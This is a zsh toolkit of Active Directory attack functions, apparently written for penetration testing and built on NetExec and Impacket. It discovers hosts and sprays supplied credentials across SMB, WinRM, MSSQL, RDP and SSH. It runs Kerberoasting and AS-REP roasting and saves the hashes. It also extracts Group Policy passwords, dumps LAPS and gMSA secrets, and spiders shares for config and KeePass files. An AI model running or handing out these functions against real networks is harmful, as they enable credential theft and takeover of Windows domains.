#!/bin/zsh

# ADSCAN
# Runs fping on the network to find live hosts and outputs their IPs to targets.list. 
# The list then gets passed onto NetExec to enumerate the machines further and get the hosts and domain names. 
# Lastly, it adds the DC’s IP and domain name to /etc/hosts to make our lives easier.
#
# Usage: adscan 172.0.0.1/24
adscan() {

    echo "
      \    _ \    __|   __|    \     \ | 
     _ \   |  | \__ \  (      _ \   .  | 
   _/  _\ ___/  ____/ \___| _/  _\ _|\_| 
"  

    if [ $# -eq 0 ]; then
        echo "\033[1;31m[!] Missing parameters. \033[0m"
        echo "Usage: $0 <CIDR Range>"
        return 1
    fi
                                       
    echo "\033[1;33m[!] Running fping on the $1 network \033[0m"  
    fping -agq "$1" | tee targets.list
    if [[ -z $(grep '[^[:space:]]' targets.list) ]] ; then
        echo "\033[1;31m[!] Wrong parameters. \033[0m"
        echo "Usage: $0 <CIDR Range>"
        return 1
    fi
    echo '\033[0;34m[*] Saving enumerated hosts to ./targets.list \033[0m'
    
    echo '\033[1;33m[!] Running NetExec on enumerated hosts \033[0m'
    nxc smb targets.list | tee nxc.tmp
    
    local domain=$(cat nxc.tmp | grep DC | grep -oP "\(name:.*\)" | cut -d ' ' -f 2 | sed "s/(//" | sed "s/)//" | cut -d ':' -f 2)
    local dc_hostname=$(cat nxc.tmp | grep DC | grep -oP "\(name:.*\)" | cut -d ' ' -f 1 | sed "s/(//" | sed "s/)//" | cut -d ':' -f 2)
    local dc_ip=$(cat nxc.tmp | grep DC | grep -oE '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}')
    echo '\033[0;34m[*] Adding DC to /etc/hosts \033[0m'
    echo "$dc_ip    $domain $dc_hostname $dc_hostname.$domain" | tee -a /etc/hosts
    rm nxc.tmp
}

# TESTCREDS
# Runs NetExec with given credentials against SMB / WinRM / MSSQL / RDP / SSH so we can test the account’s potential
# Usage: testcreds -u user [-p password] [-H hash] [-k] [--ips ips.list]
testcreds() {

    echo '  
    |               |                      |      
     _|   -_) (_-<   _|   _|   _| -_)   _` | (_-< 
   \__| \___| ___/ \__| \__| _| \___| \__,_| ___/ 
'                                               
    
    if [ $# -eq 0 ]; then
        echo "\033[1;31m[!] Missing parameters. \033[0m"
        echo "Usage: $0 -u user [-p password] [-H hash] [-k] [-d ips.list]"
        return 1
    fi 
    
    get_auth $@
    if [[ $? -eq 2 ]]; then
        echo "Usage: $0 -u user [-p password] [-H hash] [-k] [-d ips.list]"
        return 1
    fi
        
    echo -e "\033[1;33m[!] Trying credentials on SMB / WinRM / MSSQL / RDP / SSH with NetExec\033[0m"
    nxc smb $(echo "$nxc_auth") | grep --color=never +
    nxc smb $(echo "$nxc_auth") --local-auth | grep --color=never +  | highlight red "(Pwn3d!)"  
    nxc winrm $(echo "$nxc_auth") | grep --color=never + | highlight red "(Pwn3d!)"
    nxc winrm $(echo "$nxc_auth") --local-auth | grep --color=never + | highlight red "(Pwn3d!)"
    nxc mssql $(echo "$nxc_auth") | grep --color=never + | highlight red "(Pwn3d!)"
    nxc mssql $(echo "$nxc_auth") --local-auth | grep --color=never + | highlight red "(Pwn3d!)"
    nxc rdp $(echo "$nxc_auth") | grep --color=never + | highlight red "(Pwn3d!)"
    nxc rdp $(echo "$nxc_auth") --local-auth | grep --color=never +  | highlight red "(Pwn3d!)"
    nxc ssh $(echo "$nxc_auth") | grep --color=never + | highlight red "(Pwn3d!)"
}

# ENUMDOMAIN

enumdomain() {
    echo '   
                             _ \   _ \   \  |    \   _ _|   \ | 
     -_)    \   |  |   ` \   |  | (   | |\/ |   _ \    |   .  | 
   \___| _| _| \_,_| _|_|_| ___/ \___/ _|  _| _/  _\ ___| _|\_| 
'                                                               
    if [[ $# -eq 0 ]]; then
        echo "\033[1;31m[!] Missing parameters. \033[0m"
        echo "Usage: $0 -d domain -u user [-p password] [-H hash] [-k]"
        return 1
    fi     
    
    get_auth $@
    if [[ $? -eq 2 ]]; then
        echo "Usage: $0 -d domain -u user [-p password] [-H hash] [-k]"
        return 1
    fi   
    #debug
    #echo "nxc = $nxc_auth"
    #echo "imp = $imp_auth"
    #end debug    
    
    echo "\033[1;36m[?] Do you want to enumerate all domain users? This might take a while. [y/N] \033[0m"
    read -s -q confirm
    if [[ $confirm =~ ^[Yy]$ ]]; then    
      echo "\033[1;33m[!] Enumerating all users with NetExec \033[0m"
      nxc smb $(echo "$nxc_auth") --users | tr -s " " | cut -d ' ' -f 5 | grep -v '\[.\]' | cut -d '\' -f 2 > users.list
      echo '\033[0;34m[*] Saving enumerated users to ./users.list'
    fi
    
    echo "\033[1;33m[!] Enumerating privileged users with NetExec \033[0m"
    nxc ldap $(echo "$nxc_auth") --admin-count | grep -v '\[.\]' | tr -s " " | cut -d ' ' -f 5
    
    echo "\033[1;33m[!] Enumerating user descriptions with NetExec \033[0m"
    nxc ldap $(echo "$nxc_auth") -M user-desc | grep --color=never -o "User:.*"
    
    echo "\033[1;33m[!] Enumerating delegation rights with Impacket \033[0m"
    findDelegation.py "$imp_auth" | tail -n +2 | grep --color=never "\S"
    
    echo "\033[1;33m[!] Enumerating DCSync rights with NetExec \033[0m"  
    local domain1=$(echo $domain | cut -d '.' -f 1)
    local domain2=$(echo $domain | cut -d '.' -f 2)
    nxc ldap $(echo "$nxc_auth")  -M daclread -o TARGET_DN="DC=$domain1,DC=$domain2" ACTION=read RIGHTS=DCSync | grep "Trustee" | cut -d ":" -f 2 | sed 's/^[[:space:]]*//'
    
    echo "\033[1;33m[!] Searching for credentials in the GPO with NetExec \033[0m"
    nxc smb $(echo "$nxc_auth") -M gpp_password | grep -oE "\[\+\] Found credentials .*|userName:.*|Password:.*" --color=never
    nxc smb $(echo "$nxc_auth") -M gpp_autologin | grep -oE "\[\+\] Found credentials .*|Usernames:.*|Passwords:.*" --color=never
    
    echo "\033[1;33m[!] Enumerating PASSWD_NOTREQD with NetExec \033[0m" 
    nxc ldap $(echo "$nxc_auth") --password-not-required | grep --color=never -o "User:.*"
    
    echo "\033[1;33m[!] Enumerating AS-REProastable users with Impacket \033[0m"
    GetNPUsers.py "$imp_auth" | grep --color=never "\S" | tail -n +4 | awk {'print $1'}
    GetNPUsers.py "$imp_auth" -request -outputfile asrep.hash 1>/dev/null
    echo '\033[0;34m[*] Saving hashes (if any) to ./asrep.hash \033[0m'
    
    echo "\033[1;33m[!] Enumerating Kerberoastable users with Impacket \033[0m"
    GetUserSPNs.py "$imp_auth" | grep --color=never "\S" | tail -n +4 | awk {'print $2 " - "$1'}
    GetUserSPNs.py "$imp_auth" -request -outputfile kerb.hash 1>/dev/null
    echo '\033[0;34m[*] Saving hashes (if any) to ./kerb.hash \033[0m'
}

## nxc enum user
enumuser() {
    echo '   
                             |  |   __|  __|  _ \ 
     -_)    \   |  |   ` \   |  | \__ \  _|     / 
   \___| _| _| \_,_| _|_|_| \__/  ____/ ___| _|_\ 
'    
    if [ $# -eq 0 ]; then
        echo "\033[1;31m[!] Missing parameters. \033[0m"
        echo "Usage: \033[0m $0 -d domain -u user [-p password] [-H hash] [-k]"
        return 1
    fi 
    
    get_auth $@
    if [[ $? -eq 2 ]]; then
        echo "Usage: $0 -d domain -u user [-p password] [-H hash] [-k]"
        return 1
    fi        
    #debug
    echo "nxc = $nxc_auth"
    echo "imp = $imp_auth"
    #end debug
                                                  
    echo "\033[1;33m[!] Enumerating $user's shares with NetExec \033[0m"
    nxc smb $(echo "$nxc_auth") --shares | grep -E "READ|WRITE" | tr -s " " | cut -d " " -f 5- | tee ${user}_shares.tmp
    cat ${user}_shares.tmp | awk -F 'READ' '{print $1}' > ${user}_sharenames.tmp
    while read line
    do 
        echo "\033[0;34m[*] Spidering $line share for .txt/.xml/.ini/.config files \033[0m"
        nxc smb $(echo "$nxc_auth") --spider $line --regex ".txt|.xml|.config|.cnf|.conf|.ini" | grep -v "\[.\]" | tr -s " " | cut -d " " -f 5-
    done < ${user}_sharenames.tmp
    rm *.tmp
    
    echo "\033[1;33m[!] Enumerating $user's groups with NetExec \033[0m"
    nxc ldap $(echo "$nxc_auth") -M groupmembership -o USER="$user" | tail -n +4 | tr -s " " | cut -d " " -f 5-
    
    echo "\033[1;33m[!] Trying to dump gMSA passwords with NetExec \033[0m"
    nxc ldap $(echo "$nxc_auth") --gmsa | grep -oE "Account:.*" --color=never
    
    echo "\033[1;33m[!] Trying to dump LAPS passwords with NetExec \033[0m"
    nxc ldap $(echo "$nxc_auth") -M laps | tail -n +4 | tr -s " " | cut -d " " -f 6-
    
    echo "\033[1;33m[!] Trying to find KeePass files with NetExec \033[0m"
    nxc smb $(echo "$nxc_auth") -M keepass_discover | grep -oE "Found .*" --color=never
}
    

#              _                   _          __  __ 
#             | |                 | |        / _|/ _|
#     _____  _| |_ _ __ __ _   ___| |_ _   _| |_| |_ 
#    / _ \ \/ / __| '__/ _` | / __| __| | | |  _|  _|
#   |  __/>  <| |_| | | (_| | \__ \ |_| |_| | | | |  
#    \___/_/\_\\__|_|  \__,_| |___/\__|\__,_|_| |_|  
#                                                    
# 
#   Don't call these directly!                                                   


# Highlighting
function highlight() {
	declare -A fg_color_map
	fg_color_map[black]=30
	fg_color_map[red]=31
	fg_color_map[green]=32
	fg_color_map[yellow]=33
	fg_color_map[blue]=34
	fg_color_map[magenta]=35
	fg_color_map[cyan]=36
	 
	fg_c=$(echo -e "\e[1;${fg_color_map[$1]}m")
	c_rs=$'\e[0m'
	sed -u s"/$2/$fg_c\0$c_rs/g"
}

# GET_AUTH
# Used by the other functions to parse the authentication arguments.
get_auth() {
    domain="targets.list"
    while [ $# -gt 0 ]; do
      case "$1" in
        --domain|-d)
          domain="$2"
          shift
          ;;
        --user|-u)
          user="$2"
          shift
          ;;
        --password|-p)
          local password="$2"
          local auth="password"
          shift
          ;;
        --hash|-H)
          local hashes="$2"
          local auth="hashes"
          shift
          ;;
        --kerb|-k)
          local auth="kerb"
          shift
          ;;
        *)
          echo "\033[1;31m[!] Wrong parameters. \033[0m"
          return 2
          ;;
      esac
      shift
    done
    
    case $auth in
      password)
        nxc_auth="$domain -u $user -p $password"
        imp_auth="$domain/$user:$password"
        ;;
      hashes)
        nxc_auth="$domain -u $user -H $hashes"
        imp_auth="$domain/$user -hashes :$hashes"
        ;;
      kerb)
        nxc_auth="$domain -u $user --use-kcache"
        imp_auth="$domain/$user -k"
        ;;
      *)
        nxc_auth="$domain -u '' -p ''"
        imp_auth="$domain/"
    esac
}
